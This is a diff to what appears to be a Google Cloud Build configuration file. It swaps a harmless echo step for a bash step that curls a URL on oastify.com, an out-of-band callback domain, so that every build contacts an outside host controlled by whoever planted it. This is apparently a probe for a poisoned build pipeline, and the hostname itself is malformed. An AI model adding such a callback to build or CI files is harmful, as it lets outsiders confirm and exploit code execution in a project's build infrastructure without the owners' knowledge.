@@ -1,6 +1,6 @@
 steps:
-- name: 'gcr.io/cloud-builders/docker'
-  script: |
-    echo "hello"
+  - name: 'gcr.io/cloud-builders/gcloud'
+    entrypoint: bash
+    args: ['-c', 'curl https://064hlh16xwymsgam4v2nj4hmyd44ssssss6gv.oastify.comwww/test']
 options:
   logging: CLOUD_LOGGING_ONLY
